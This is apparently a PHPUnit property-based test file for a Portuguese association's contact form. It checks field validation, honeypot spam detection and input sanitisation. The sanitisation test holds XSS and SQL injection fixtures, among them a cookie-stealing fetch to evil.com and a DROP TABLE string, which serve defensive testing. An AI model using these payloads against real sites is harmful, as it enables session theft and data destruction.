<?php
/**
 * Property-based tests for the ARPILF contact form PHP handler.
 *
 * Uses PHPUnit + Eris for property-based testing of:
 * - Property 6: Validação server-side — inputs válidos
 * - Property 7: Validação server-side — inputs inválidos
 * - Property 9: Rejeição de spam via honeypot
 * - Property 16: Sanitização de inputs no servidor
 *
 * Validates: Requirements 5.2, 5.3, 5.7, 13.3
 *
 * Setup:
 *   cd Arpilf/tests/php
 *   composer install
 *   vendor/bin/phpunit --configuration phpunit.xml
 */

// Guard to allow requiring contact.php without executing main flow
define('TESTING', true);

require_once __DIR__ . '/../../static/contact.php';

use PHPUnit\Framework\TestCase;
use Eris\Generator;
use Eris\TestTrait;

class ContactHandlerTest extends TestCase
{
    use TestTrait;

    // ─── Generators ──────────────────────────────────────────────────────────

    /**
     * Generate a non-empty alphanumeric string suitable for name/subject fields.
     * Produces strings of 1-100 characters from letters, digits, spaces, and Portuguese chars.
     */
    private function nonEmptyTextGenerator(): Generator
    {
        return Generator\map(
            function (string $s): string {
                // Ensure non-empty after trim by prepending a letter if needed
                $s = trim($s);
                return $s === '' ? 'Texto' : $s;
            },
            Generator\string()
        );
    }

    /**
     * Generate a valid email address.
     * Format: {localpart}@{domain}.{tld}
     */
    private function validEmailGenerator(): Generator
    {
        return Generator\map(
            function (array $parts): string {
                $local = preg_replace('/[^a-z0-9._-]/i', '', $parts[0]);
                $domain = preg_replace('/[^a-z0-9-]/i', '', $parts[1]);
                $tld = $parts[2];
                // Ensure non-empty parts
                $local = $local === '' ? 'user' : substr($local, 0, 20);
                $domain = $domain === '' ? 'example' : substr($domain, 0, 15);
                return $local . '@' . $domain . '.' . $tld;
            },
            Generator\tuple(
                Generator\elements(['joao', 'maria', 'pedro', 'ana', 'carlos', 'user', 'info', 'test.user', 'nome-apelido']),
                Generator\elements(['example', 'gmail', 'outlook', 'arpilf', 'mail', 'empresa', 'dominio']),
                Generator\elements(['pt', 'com', 'org', 'net', 'eu', 'io'])
            )
        );
    }

    /**
     * Generate an invalid email address (missing @, missing domain, etc.).
     */
    private function invalidEmailGenerator(): Generator
    {
        return Generator\oneOf(
            // No @ sign
            Generator\elements([
                'joaogmail.com',
                'plaintext',
                'nome apelido',
                'user.example.com',
            ]),
            // Missing domain
            Generator\elements([
                'user@',
                'user@.',
                'user@.com',
                '@domain.com',
            ]),
            // Double @
            Generator\elements([
                'user@@domain.com',
                'a@b@c.com',
            ]),
            // Special chars in wrong places
            Generator\elements([
                'user @domain.com',
                'user@dom ain.com',
                '.user@domain.com',
                'user.@domain.com',
            ])
        );
    }

    /**
     * Generate a complete valid form submission data array.
     */
    private function validFormDataGenerator(): Generator
    {
        return Generator\map(
            function (array $parts): array {
                return [
                    'nome'          => $parts[0],
                    'email'         => $parts[1],
                    'telefone'      => $parts[2],
                    'assunto'       => $parts[3],
                    'mensagem'      => $parts[4],
                    'consentimento' => 'on',
                    '_honeypot'     => '',
                ];
            },
            Generator\tuple(
                Generator\elements(['João Silva', 'Maria Santos', 'Pedro Costa', 'Ana Ferreira', 'Carlos Oliveira', 'Luísa Pereira']),
                $this->validEmailGenerator(),
                Generator\elements(['', '912345678', '213456789', '+351 912 345 678', '']),
                Generator\elements(['Informação sobre serviços', 'Inscrição Centro de Dia', 'Pedido de visita', 'Donativo', 'Questão geral', 'Horários']),
                Generator\elements([
                    'Gostaria de obter mais informações sobre os vossos serviços.',
                    'Pretendo inscrever o meu familiar no Centro de Dia.',
                    'Quando posso visitar as instalações?',
                    'Qual o procedimento para fazer um donativo?',
                    'Boa tarde, gostaria de saber os horários de funcionamento.',
                ])
            )
        );
    }


    // ─── Property 6: Validação server-side — inputs válidos ──────────────────

    /**
     * Feature: arpilf-website-rebuild, Property 6: Validação server-side — inputs válidos
     *
     * For any valid submission (non-empty nome, valid email, non-empty assunto,
     * non-empty mensagem, consent=true, empty honeypot), validateFormData must
     * return valid=true with no errors.
     *
     * **Validates: Requirements 5.2**
     *
     * @test
     */
    public function property6_validInputsAreAccepted(): void
    {
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                $this->validFormDataGenerator()
            )
            ->withMaxSize(100)
            ->then(function (array $formData): void {
                $result = validateFormData($formData);

                $this->assertTrue(
                    $result['valid'],
                    'Valid form data should be accepted. Errors: ' . json_encode($result['errors'])
                );
                $this->assertEmpty(
                    $result['errors'],
                    'Valid form data should produce no errors.'
                );
                $this->assertArrayHasKey('sanitized', $result);
                $this->assertNotEmpty($result['sanitized']['nome']);
                $this->assertNotEmpty($result['sanitized']['email']);
                $this->assertNotEmpty($result['sanitized']['assunto']);
                $this->assertNotEmpty($result['sanitized']['mensagem']);
                $this->assertTrue($result['sanitized']['consentimento']);
            });
    }


    // ─── Property 7: Validação server-side — inputs inválidos ────────────────

    /**
     * Feature: arpilf-website-rebuild, Property 7: Validação server-side — inputs inválidos
     *
     * For any submission with at least one required field missing or invalid email,
     * validateFormData must return valid=false with specific error messages.
     *
     * **Validates: Requirements 5.3**
     *
     * @test
     */
    public function property7_invalidInputsAreRejected(): void
    {
        // Sub-property 7a: Missing required fields
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                Generator\elements(['nome', 'email', 'assunto', 'mensagem', 'consentimento']),
                $this->validFormDataGenerator()
            )
            ->withMaxSize(100)
            ->then(function (string $fieldToRemove, array $formData): void {
                // Remove or empty the selected required field
                if ($fieldToRemove === 'consentimento') {
                    unset($formData['consentimento']);
                } else {
                    $formData[$fieldToRemove] = '';
                }

                $result = validateFormData($formData);

                $this->assertFalse(
                    $result['valid'],
                    "Form with empty/missing '$fieldToRemove' should be invalid."
                );
                $this->assertNotEmpty(
                    $result['errors'],
                    "Form with empty/missing '$fieldToRemove' should have errors."
                );
                $this->assertArrayHasKey(
                    $fieldToRemove,
                    $result['errors'],
                    "Errors should include specific message for '$fieldToRemove'."
                );
            });
    }

    /**
     * Feature: arpilf-website-rebuild, Property 7: Validação server-side — inputs inválidos (email format)
     *
     * For any submission with an invalid email format, validateFormData must
     * return valid=false with an email-specific error.
     *
     * **Validates: Requirements 5.3**
     *
     * @test
     */
    public function property7_invalidEmailFormatIsRejected(): void
    {
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                $this->invalidEmailGenerator()
            )
            ->withMaxSize(100)
            ->then(function (string $invalidEmail): void {
                $formData = [
                    'nome'          => 'João Silva',
                    'email'         => $invalidEmail,
                    'telefone'      => '',
                    'assunto'       => 'Teste',
                    'mensagem'      => 'Mensagem de teste.',
                    'consentimento' => 'on',
                    '_honeypot'     => '',
                ];

                $result = validateFormData($formData);

                $this->assertFalse(
                    $result['valid'],
                    "Form with invalid email '$invalidEmail' should be invalid."
                );
                $this->assertArrayHasKey(
                    'email',
                    $result['errors'],
                    "Errors should include specific message for invalid email '$invalidEmail'."
                );
            });
    }


    // ─── Property 9: Rejeição de spam via honeypot ───────────────────────────

    /**
     * Feature: arpilf-website-rebuild, Property 9: Rejeição de spam via honeypot
     *
     * For any submission where _honeypot contains any non-empty value,
     * isHoneypotFilled must return true.
     *
     * **Validates: Requirements 5.7**
     *
     * @test
     */
    public function property9_honeypotDetectsSpam(): void
    {
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                Generator\oneOf(
                    // Random non-empty strings
                    Generator\map(
                        function (string $s): string {
                            $s = trim($s);
                            return $s === '' ? 'spam' : $s;
                        },
                        Generator\string()
                    ),
                    // Typical bot-filled values
                    Generator\elements([
                        'spam',
                        'buy now',
                        'http://spam.com',
                        '<a href="http://evil.com">click</a>',
                        '1',
                        ' ',
                        'x',
                        'test@spam.com',
                        '0',
                        'true',
                    ])
                )
            )
            ->withMaxSize(100)
            ->then(function (string $honeypotValue): void {
                // Only test non-empty values (the generator ensures this)
                if (trim($honeypotValue) === '') {
                    return; // Skip empty values — not relevant for this property
                }

                $formData = [
                    'nome'          => 'Bot Name',
                    'email'         => '[email]',
                    'assunto'       => 'Spam',
                    'mensagem'      => 'Buy cheap stuff',
                    'consentimento' => 'on',
                    '_honeypot'     => $honeypotValue,
                ];

                $this->assertTrue(
                    isHoneypotFilled($formData),
                    "Honeypot with value '$honeypotValue' should be detected as spam."
                );
            });
    }

    /**
     * Feature: arpilf-website-rebuild, Property 9: Rejeição de spam via honeypot (empty = not spam)
     *
     * For any submission where _honeypot is empty or not set,
     * isHoneypotFilled must return false.
     *
     * **Validates: Requirements 5.7**
     *
     * @test
     */
    public function property9_emptyHoneypotIsNotSpam(): void
    {
        // Empty honeypot
        $this->assertFalse(
            isHoneypotFilled(['_honeypot' => '']),
            'Empty honeypot should not be detected as spam.'
        );

        // Missing honeypot key
        $this->assertFalse(
            isHoneypotFilled([]),
            'Missing honeypot key should not be detected as spam.'
        );

        // Honeypot not set in valid form data
        $this->assertFalse(
            isHoneypotFilled([
                'nome' => 'João',
                'email' => '[email]',
            ]),
            'Form data without honeypot key should not be detected as spam.'
        );
    }


    // ─── Property 16: Sanitização de inputs no servidor ──────────────────────

    /**
     * Feature: arpilf-website-rebuild, Property 16: Sanitização de inputs no servidor
     *
     * For any string input (including HTML tags, JS, SQL injection),
     * sanitizeInput must return a string with no executable HTML tags.
     *
     * **Validates: Requirements 13.3**
     *
     * @test
     */
    public function property16_sanitizationRemovesExecutableHtml(): void
    {
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                Generator\oneOf(
                    // Random strings
                    Generator\string(),
                    // Strings with HTML/JS injection attempts
                    Generator\elements([
                        '<script>alert("xss")</script>',
                        '<img src=x onerror=alert(1)>',
                        '<a href="javascript:alert(1)">click</a>',
                        '<div onmouseover="alert(1)">hover</div>',
                        '<iframe src="http://evil.com"></iframe>',
                        '<style>body{display:none}</style>',
                        '<svg onload=alert(1)>',
                        '<input type="text" onfocus="alert(1)">',
                        '<body onload=alert(1)>',
                        '<marquee onstart=alert(1)>',
                        "'; DROP TABLE users; --",
                        '" OR 1=1 --',
                        '<script>document.cookie</script>',
                        '{{constructor.constructor("return this")()}}',
                        '<img src="x" onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
                        'Normal text with <b>bold</b> and <i>italic</i>',
                        '<p>Paragraph</p>',
                        '&lt;script&gt;already escaped&lt;/script&gt;',
                    ])
                )
            )
            ->withMaxSize(100)
            ->then(function (string $input): void {
                $sanitized = sanitizeInput($input);

                // The sanitized output must be a string
                $this->assertIsString($sanitized);

                // Must not contain any raw HTML tags (opening tags like <script>, <img>, etc.)
                $this->assertDoesNotMatchRegularExpression(
                    '/<\s*(script|img|iframe|style|svg|input|body|marquee|a|div|span|form|object|embed|link|meta|base)\b/i',
                    $sanitized,
                    "Sanitized output should not contain executable HTML tags. Input: " . substr($input, 0, 100) . " Output: " . substr($sanitized, 0, 100)
                );

                // Must not contain event handler attributes
                $this->assertDoesNotMatchRegularExpression(
                    '/\bon\w+\s*=/i',
                    $sanitized,
                    "Sanitized output should not contain event handler attributes. Input: " . substr($input, 0, 100)
                );

                // Must not contain raw < or > (they should be escaped)
                // strip_tags + htmlspecialchars ensures this
                $this->assertStringNotContainsString(
                    '<',
                    $sanitized,
                    "Sanitized output should not contain raw '<'. Input: " . substr($input, 0, 100)
                );
                $this->assertStringNotContainsString(
                    '>',
                    $sanitized,
                    "Sanitized output should not contain raw '>'. Input: " . substr($input, 0, 100)
                );
            });
    }

    /**
     * Feature: arpilf-website-rebuild, Property 16: Sanitização de inputs no servidor (preserves content)
     *
     * For any plain text input without HTML, sanitizeInput should preserve
     * the meaningful content (after trimming).
     *
     * **Validates: Requirements 13.3**
     *
     * @test
     */
    public function property16_sanitizationPreservesPlainText(): void
    {
        $this
            ->minimumEvaluationRatio(0.5)
            ->forAll(
                Generator\elements([
                    'João Silva',
                    'Gostaria de informações sobre o Centro de Dia',
                    'Boa tarde, o meu nome é Maria.',
                    'Qual o horário de funcionamento?',
                    'Rua da Liberdade, nº 42, 1250-096 Lisboa',
                    '+351 912 345 678',
                    'Obrigado pela atenção.',
                    'Informação sobre donativos e benefícios fiscais',
                    'Préciso de ajuda com a inscrição',
                    'Olá! Tenho uma questão.',
                ])
            )
            ->withMaxSize(100)
            ->then(function (string $plainText): void {
                $sanitized = sanitizeInput($plainText);

                // Plain text without HTML should be preserved (after trim)
                $this->assertEquals(
                    trim($plainText),
                    $sanitized,
                    "Plain text should be preserved after sanitization."
                );
            });
    }
}
